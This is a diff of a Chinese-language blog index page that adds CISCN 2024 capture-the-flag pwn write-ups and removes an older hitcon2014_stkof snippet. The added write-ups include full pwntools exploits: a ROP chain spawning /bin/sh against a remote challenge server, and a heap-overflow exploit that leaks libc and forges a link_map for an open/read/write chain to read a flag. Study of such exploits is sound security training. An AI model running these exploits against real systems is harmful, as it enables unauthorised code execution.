@@ -206,6 +206,101 @@
             
 
   
+    <article id="post-ciscn-pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/05/19/ciscn-pwn/" target="_blank">ciscn_pwn</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/05/19/ciscn-pwn/" class="archive-article-date">
+        <time datetime="2024-05-19T08:17:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-05-19</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="第一天-gostack"><a href="#第一天-gostack" class="headerlink" title="第一天_gostack"></a>第一天_gostack</h2><h5 id="64位的静态编译题"><a href="#64位的静态编译题" class="headerlink" title="64位的静态编译题"></a>64位的静态编译题</h5><p><img src="https://s2.loli.net/2024/05/19/xeACKin2JEw7B8X.png" alt="image-20240519162316093"></p>
+<p><img src="https://s2.loli.net/2024/05/19/5HwmgvtCEARJojT.png" alt="image-20240519162532844"></p>
+<h5 id="很明显的syscall和很多可以利用的gadget"><a href="#很明显的syscall和很多可以利用的gadget" class="headerlink" title="很明显的syscall和很多可以利用的gadget"></a>很明显的syscall和很多可以利用的gadget</h5><p><img src="https://s2.loli.net/2024/05/19/lAQMKgWLYoJOx2n.png" alt="image-20240519162808628"></p>
+<p><img src="https://s2.loli.net/2024/05/19/WIfjVbrg7SMcAPh.png" alt="image-20240519162853532"></p>
+<h5 id="利用syscall向bss段写入-bin-sh，再syscall执行execve-‘bin-sh’-0-0-拿到flag"><a href="#利用syscall向bss段写入-bin-sh，再syscall执行execve-‘bin-sh’-0-0-拿到flag" class="headerlink" title="利用syscall向bss段写入 bin&#x2F;sh，再syscall执行execve(‘bin&#x2F;sh’,0,0),拿到flag"></a>利用syscall向bss段写入 bin&#x2F;sh，再syscall执行execve(‘bin&#x2F;sh’,0,0),拿到flag</h5><p><img src="https://s2.loli.net/2024/05/19/PIrL94hM2jltmno.png" alt="image-20240519163321686"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;8.147.134.47&quot;</span>,<span class="number">16589</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./gostack&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./gostack&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># Gadgets and syscall addresses</span></span><br><span class="line">syscall_address = <span class="number">0x404043</span></span><br><span class="line">rax_ret_address = <span class="number">0x40f984</span></span><br><span class="line">rdi_6_ret_address = <span class="number">0x4a18a5</span></span><br><span class="line">rsi_ret_address = <span class="number">0x42138a</span></span><br><span class="line">rdx_ret_address = <span class="number">0x4944ec</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(elf.bss()) + p64(<span class="number">0x10</span>) + p64(<span class="number">0</span>) * <span class="number">0x18</span></span><br><span class="line">payload += p64(rdi_6_ret_address) + p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">payload += p64(rsi_ret_address) + p64(elf.bss() + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(rdx_ret_address) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(rax_ret_address) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_address)</span><br><span class="line">payload += p64(rdi_6_ret_address) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload += p64(rdi_6_ret_address) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload += p64(rdi_6_ret_address) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload += p64(rsi_ret_address) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_ret_address) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rax_ret_address) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(syscall_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the payload</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;message :\n&#x27;</span>, payload)</span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><p><img src="https://s2.loli.net/2024/05/19/tjciLKWbQEsTOF2.png" alt="image-20240519164039631"></p>
+<h5 id="edit函数存在堆溢出"><a href="#edit函数存在堆溢出" class="headerlink" title="edit函数存在堆溢出"></a>edit函数存在堆溢出</h5><p><img src="https://s2.loli.net/2024/05/19/WyVCcLqEt6MK45J.png" alt="image-20240519164143452"></p>
+<h5 id="开启了沙箱保护-这是一道堆的orw。"><a href="#开启了沙箱保护-这是一道堆的orw。" class="headerlink" title="开启了沙箱保护,这是一道堆的orw。"></a>开启了沙箱保护,这是一道堆的orw。</h5><p><img src="https://s2.loli.net/2024/05/19/EVw45MF9RsYUeTp.png" alt="image-20240519164437835"></p>
+<h5 id="泄露出堆的基地址"><a href="#泄露出堆的基地址" class="headerlink" title="泄露出堆的基地址"></a>泄露出堆的基地址</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add_chunk(<span class="number">0x28</span>)</span><br><span class="line">add_chunk(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit and leak heap address</span></span><br><span class="line">edit_chunk(<span class="number">0</span>, <span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span>)</span><br><span class="line">show_chunk(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">heap_leak = u64(io.recvuntil(<span class="string">b&#x27;Welcome to CISCN 2024!&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_leak &lt;&lt; <span class="number">12</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/05/19/eM7kiyhCDB5rKgT.png" alt="image-20240519165038422"></p>
+<h5 id="将free-hook改成setcontext-通过setcontext控制rsp进而orw-构造rop最后获得flag"><a href="#将free-hook改成setcontext-通过setcontext控制rsp进而orw-构造rop最后获得flag" class="headerlink" title="将free_hook改成setcontext,通过setcontext控制rsp进而orw,构造rop最后获得flag"></a>将free_hook改成setcontext,通过setcontext控制rsp进而orw,构造rop最后获得flag</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./EzHeap&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;EzHeap&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;8.147.129.121&#x27;, 26987)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_chunk</span>(<span class="params">size, content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(<span class="built_in">int</span>(size)))</span><br><span class="line">    io.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_chunk</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_chunk</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_chunk</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_program</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice &gt;&gt; &quot;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add initial chunks</span></span><br><span class="line">add_chunk(<span class="number">0x28</span>)</span><br><span class="line">add_chunk(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit and leak heap address</span></span><br><span class="line">edit_chunk(<span class="number">0</span>, <span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span>)</span><br><span class="line">show_chunk(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">heap_leak = u64(io.recvuntil(<span class="string">b&#x27;Welcome to CISCN 2024!&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_leak &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit chunk to set up fake chunk</span></span><br><span class="line">edit_chunk(<span class="number">0</span>, <span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x28</span> + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0xd1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak libc address</span></span><br><span class="line">edit_chunk(<span class="number">1</span>, <span class="number">0x30</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">show_chunk(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">libc_leak = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = libc_leak - <span class="number">0x21ace0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit chunk to consolidate chunks</span></span><br><span class="line">edit_chunk(<span class="number">1</span>, <span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x28</span> + p64(<span class="number">0xf1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up libc addresses</span></span><br><span class="line">setcontext_address = libc_base + <span class="number">0x539e0</span> + <span class="number">61</span></span><br><span class="line">read_address = libc_base + <span class="number">0x1147d0</span></span><br><span class="line">write_address = libc_base + <span class="number">0x114870</span></span><br><span class="line">rtld_global_address = libc_base + <span class="number">0x285040</span></span><br><span class="line">rtld_3_address = libc_base + <span class="number">0x2865a0</span></span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0xe7d0d</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x11f2e7</span>  <span class="comment"># r12</span></span><br><span class="line">ret = libc_base + <span class="number">0x1193c1</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x45eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x91316</span></span><br><span class="line">target_address = ((heap_base + <span class="number">0x1e30</span>) &gt;&gt; <span class="number">12</span>) ^ rtld_global_address</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add chunks to manipulate heap</span></span><br><span class="line">add_chunk(<span class="number">0x78</span>)  <span class="comment"># Chunk 2</span></span><br><span class="line">add_chunk(<span class="number">0x78</span>)  <span class="comment"># Chunk 3</span></span><br><span class="line">add_chunk(<span class="number">0x78</span>)  <span class="comment"># Chunk 4</span></span><br><span class="line">add_chunk(<span class="number">0x78</span>)  <span class="comment"># Chunk 5</span></span><br><span class="line">edit_chunk(<span class="number">5</span>, <span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x78</span> + p64(<span class="number">0x21</span>) + p64(target_address))</span><br><span class="line">add_chunk(<span class="number">0x18</span>)  <span class="comment"># Chunk 6</span></span><br><span class="line">add_chunk(<span class="number">0x18</span>)  <span class="comment"># Chunk 7</span></span><br><span class="line">add_chunk(<span class="number">0x18</span>)  <span class="comment"># Chunk 8</span></span><br><span class="line">add_chunk(<span class="number">0x18</span>)  <span class="comment"># Chunk 9</span></span><br><span class="line">add_chunk(<span class="number">0x18</span>, p64(heap_base + <span class="number">0x300</span>) + p64(<span class="number">5</span>) + p64(rtld_3_address))</span><br><span class="line"></span><br><span class="line">heap_leak_adjusted = heap_base - <span class="number">0x650</span></span><br><span class="line">l_next_address = libc_base + <span class="number">0x286890</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create link map</span></span><br><span class="line">link_map = p64(<span class="number">0</span>)</span><br><span class="line">link_map += p64(l_next_address)</span><br><span class="line">link_map += p64(<span class="number">0</span>)</span><br><span class="line">link_map += p64(heap_leak_adjusted + <span class="number">0x940</span>)</span><br><span class="line">link_map += p64(<span class="number">0</span>) * <span class="number">28</span></span><br><span class="line">link_map += p64(heap_leak_adjusted + <span class="number">0xa50</span>)</span><br><span class="line">link_map += p64(heap_leak_adjusted + <span class="number">0xa70</span>)</span><br><span class="line">link_map += p64(heap_leak_adjusted + <span class="number">0xa60</span>)</span><br><span class="line">link_map += p64(<span class="number">0x10</span>)</span><br><span class="line">link_map += p64(setcontext_address)</span><br><span class="line">link_map += p64(ret)</span><br><span class="line">link_map += p64(<span class="number">0</span>) * <span class="number">13</span></span><br><span class="line">link_map += p64(heap_leak_adjusted + <span class="number">0x200</span>)</span><br><span class="line">link_map += <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">link_map += p64(<span class="number">0</span>)</span><br><span class="line">link_map += p64(<span class="number">0x100</span>)</span><br><span class="line">link_map += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">link_map += p64(heap_leak_adjusted + <span class="number">0xc60</span>)</span><br><span class="line">link_map += p64(ret)</span><br><span class="line">link_map += p64(<span class="number">0</span>) * <span class="number">38</span></span><br><span class="line">link_map += p64(<span class="number">0x800000000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create ROP chain</span></span><br><span class="line">rop_chain = p64(ret) * <span class="number">0x1</span></span><br><span class="line">rop_chain += p64(pop_rdi) + p64(heap_leak_adjusted + <span class="number">0xaf0</span>)</span><br><span class="line">rop_chain += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">rop_chain += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(syscall)</span><br><span class="line"></span><br><span class="line">rop_chain += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + <span class="number">0x800</span>)</span><br><span class="line">rop_chain += p64(pop_rdx) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(read_address)</span><br><span class="line">rop_chain += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">rop_chain += p64(pop_rsi) + p64(heap_leak_adjusted + <span class="number">0x800</span>)</span><br><span class="line">rop_chain += p64(pop_rdx) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(write_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit chunk with link map and ROP chain</span></span><br><span class="line">edit_chunk(<span class="number">0</span>, <span class="number">0x400</span>, link_map + rop_chain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exit and trigger the payload</span></span><br><span class="line">exit_program()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/05/19/ciscn-pwn/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-easyshell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -311,7 +406,14 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    
+    <p>chunk就是一整个</p>
+<p><img src="https://s2.loli.net/2024/05/14/f3vUmEAbwlS7J6j.png" alt="image-20240514230404731"></p>
+<p> malloc返回的指针指向chunk的数据区域</p>
+<p>free返回的指针指向chunk的header</p>
+<p>pre_size只有在上一个chunk（物理相邻）是释放时才属于下一个chunk的区域，否则属于上一个chunk的</p>
+<p>free_chunk的大小 0x20~0x0x80,malloc(8)得到的是0x20的chunk</p>
+<p><img src="https://s2.loli.net/2024/05/14/Y7PbWRAnHrodXKG.png" alt="image-20240514230437610"></p>
+
     
 
     
@@ -945,83 +1047,6 @@
     
     <p class="article-more-link">
       <a class="article-more-a" href="/2024/03/18/ciscn-2019-es-7/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-hitcon2014-stkof" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2024/03/16/hitcon2014-stkof/" target="_blank">hitcon2014_stkof</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2024/03/16/hitcon2014-stkof/" class="archive-article-date">
-        <time datetime="2024-03-16T14:10:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-16</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h5 id="偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink"><a href="#偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink" class="headerlink" title="偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink"></a>偏移都没开，有个堆溢出漏洞，刚巧不久前做了一道堆溢出，但是做法对于这道题没什么用，没有show函数，没有偏移保护可以用unlink</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x602140</span>+<span class="number">0x10</span></span><br><span class="line">fd=bss-<span class="number">0x18</span></span><br><span class="line">bk=bss-<span class="number">0x10</span></span><br><span class="line">payload=p32(<span class="number">0</span>)+p32(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(fd)+p64(bk)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i0.imgs.ovh/2024/03/15/eVoRI.png" alt="image-20240316223611733"></p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2024/03/16/hitcon2014-stkof/">展开全文 >></a>
     </p>
     
 
